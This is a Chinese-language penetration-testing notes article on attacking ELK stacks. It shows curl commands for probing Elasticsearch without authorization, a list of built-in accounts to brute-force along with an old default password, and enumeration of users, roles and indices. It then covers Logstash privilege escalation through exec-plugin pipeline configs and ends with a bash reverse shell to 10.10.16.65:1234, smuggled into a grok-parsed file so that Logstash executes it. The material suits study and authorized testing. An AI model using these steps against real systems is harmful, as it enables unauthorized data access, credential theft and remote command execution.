通过此文章，我将提供有关ELK在攻击利用与安全防护。关于利用ELK
的信息在网上非常罕见。因此，这篇文章只是本人在日常工作和学习中的个人笔记，虽不完善，但可作为学习参考。通过这篇文章希望能为你提供一些在渗透测试期间可能有用的方法。  
背景  
ELK描述了一个包含三个开源项目的集合：Elasticsearch，Logstash和Kibana。Elasticsearch存储数据并提供快速搜索引擎。Kibana是一个图形界面，允许对Elasticsearch中存储的数据进行分析和可视化。Logstash用于收集从不同来源的数据并将其保存到Elasticsearch中。  
重要配置文件
    Elasticsearch配置：/etc/elasticsearch/elasticsearch.yml
        Logstash配置：
        /etc/logstash/logstash.yml
        /etc/logstash/pipelines.yml
        /etc/logstash/conf.d/*
        Filebeat配置：/etc/filebeat/filebeat.yml
        Kibana配置：/etc/kibana/kibana.yml
在渗透测试中配置文件中总是有可能包含用户凭证，所以总是值得一看的。
**Elasticsearch未授权访问的检测与利用**
ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放9200端口，可被非法操作数据。
检测是否存在未授权访问  
默认情况下，并不总是启用身份验证。可以访问所有存储的数据  
HTTP协议访问默认端口端口 9200  
返回内容中包含”You Know, for Search”存在未授权访问。如果9200无法访问，说明开发者已经将默认端口更改  
通过访问我们得到数据库版本：
    curl -X GET "localhost:9200/"
    {
      "name" : "userver",
      "cluster_name" : "elasticsearch",
      "cluster_uuid" : "lZNH15okQPWfNHp-Aks0OQ",
      "version" : {
        "number" : "7.9.3",
        "build_flavor" : "default",
        "build_type" : "deb",
        "build_hash" : "c4138e51121ef06a6404866cddc601906fe5c868",
        "build_date" : "2021-03-26T10:36:16.141335Z",
        "build_snapshot" : false,
        "lucene_version" : "8.6.2",
        "minimum_wire_compatibility_version" : "6.8.0",
        "minimum_index_compatibility_version" : "6.0.0-beta1"
      },
      "tagline" : "You Know, for Search"
    }
如果可以访问上述信息，可能是禁用身份验证。我们可以继续验证是否禁用了身份验证：
    curl -X GET "localhost:9200/_xpack/security/user"
    {"error":{"root_cause":[{"type":"exception","reason":"Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node."}],"type":"exception","reason":"Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node."},"status":500}
如果看到以上信息，在这种情况下，身份验证是被禁用，我们可以访问所有数据。  
如果收到以下响应，则启用身份验证：
    {"error":{"root_cause":[{"type":"security_exception","reason":"missing authentication credentials for REST request [/]","header":{"WWW-Authenticate":"Basic realm=\"security\" charset=\"UTF-8\""}}],"type":"security_exception","reason":"missing authentication credentials for REST request [/]","header":{"WWW-Authenticate":"Basic realm=\"security\" charset=\"UTF-8\""}},"status":401}
在这启用身份验证的情况下，可以暴力破解内置用户，默认的一些内置用户有：
    elastic（这是超级用户！Elasticsearch的旧版本具有该用户的默认密码changeme）
    logstash_system
    kibana_system
    apm_system
    beats_system
    remote_monitoring_user
如果在启用身份验证的情况下仍能够接收版本信息，也可以进行匿名访问。匿名用户名可能是_anonymous。  
使用API密钥：
    curl -H "Authorization: ApiKey" localhost:9200/
获取有关用户权限的更多信息：
    curl -X GET "localhost:9200/_security/user/"
列出系统上的所有用户：
    curl -X GET "localhost:9200/_security/user"
列出系统上的所有角色：
    curl -X GET "localhost:9200/_security/role
ES数据库一些在渗透测试中可以利用的URL访问数据查询
    curl 'localhost:9200/_cat/indices?v' #列出所有索引
    curl 'localhost:9200/_plugin/head/  #ES的head插件，可以对es数据库进行各种设置和数据检索功能的   管理插件
    curl 'localhost:9200/_cat/nodes?v'  #可以获取集群的节点列表
    curl 'localhost:9200/_nodes?prettify'  #节点设置
    curl 'localhost:9200/_status'   #查看状态
    curl 'localhost:9200/_search?pretty'  #查询所有索引 默认前10条
    curl 'localhost:9200/zjftu/_search?pretty' #查询某一个索引
**Kibana**
Kibana为在Elasticsearch中建立索引的数据提供搜索和数据可视化功能。该服务默认在端口5601上运行。  
Elasticsearch中的用户权限与Kibana中的相同。如果在Elasticsearch中禁用了身份验证，则也应该不使用凭据访问Kibana。并且可以在配置文件/etc/kibana/kibana.yml中找到凭证
**Logstash渗透测试和安全配置**
Logstash是ELK堆栈的最后一项服务，用于收集，转换和输出日志。这是通过使用包含输入，过滤器和输出模块的管道来实现的  
pipeline 配置文件/etc/logstash/pipelines.yml指定使用的pipeline 位置：
    # This file is where you define your pipelines. You can define multiple.
    # For more information on multiple pipelines, see the documentation:
    # https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html
    - pipeline.id: main
      path.config: "/etc/logstash/conf.d/*.conf"
    - pipeline.id: example
      path.config: "/usr/share/logstash/pipeline/1*.conf"
      pipeline.workers: 6
你可以找到目前所使用的.conf文件的路径。  
**  
权限提升的使用**
在尝试提升自己的特权之前，应检查哪个用户正在运行logstash服务，默认情况下，logstash服务以logstash用户的权限运行。
通过logstash权限提升需要满足以下条件：
    对.conf文件具有写权限，或者对/etc/logstash/pipelines.yml配置文件可以写
    可以重新启动logstash服务或/etc/logstash/logstash.yml包含配置config.reload.automatic：true
可以将以下内容写入文件以执行命令：
    input {
      exec {
        command => "whoami"
        interval => 120
      }
    }
    output {
      file {
        path => "/tmp/output.log"
        codec => rubydebug
      }
    }
如果/etc/logstash/logstash.yml中配置了config.reload.automatic：true，则只需等待命令执行，因为Logstash会自动识别新的配置文件或现有配置中的任何更改。否则需要重启logstash服务。
**Logstash提权二**
Logstash的conf.d配置目录通常由三个文件组成（input、filter、output）。在output.conf中执行命令。如果你具有logstash的基本知识，则应该了解这三个文件的功能。input.conf用于配置数据源。filter.conf用于处理数据，通常与grok结合使用。output.conf用于输出处理后的数据。我们可以发现在output.conf中的exec
这个利用非常明显。创建一个/opt/kibana/名称以开头的文件logstah_。并确保grok可以正确解析文件中的内容。然后，命令可以成功执行。最重要的部分是如何创建要解析的comando内容。因此，需要知道如何使用grok通过正则表达式识别特定字段。
    grok 语法：%{SYNTAX:SEMANTIC} 即 %{正则:自定义字段名}
    官方提供了很多正则:https://github.com/logstash-plugins/logstash-patterns-core/blob/master/patterns
    ​  grok debug工具： http://grokdebug.herokuapp.com
表达是很简单的。如果你知道正则表达式，那么这里的表达式将很容易理解。
修改配置文件如下  
filter.conf
    filter {
            if [type] == "execute" {
                    grok {
                            match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                    }
            }
    }
input.conf
    input {
            file {
                    path => "/opt/kibana/logstash_*"
                    start_position => "beginning"
                    sincedb_path => "/dev/null"
                    stat_interval => "10 second"
                    type => "execute"
                    mode => "read"
            }
    }
output.conf
    output {
            if [type] == "execute" {
                    stdout { codec => json }
                    exec {
                            command => "%{comando} &"
                    }
            }
    }
接下来创建好可以解析的文件了，并把我我们要执行的命令放进入。反向shell命令我们直接用bash。所以我使用bash -i >&
/dev/tcp/10.10.16.65/1234 0>&1。将内容写入相应的文件：
    echo "Ejecutar  comando: bash -i >& /dev/tcp/10.10.16.65/1234 0>&1" > /opt/kibana/logstash_1.txt
使用nc监听端口1234，稍等片刻，就会得到反向shell。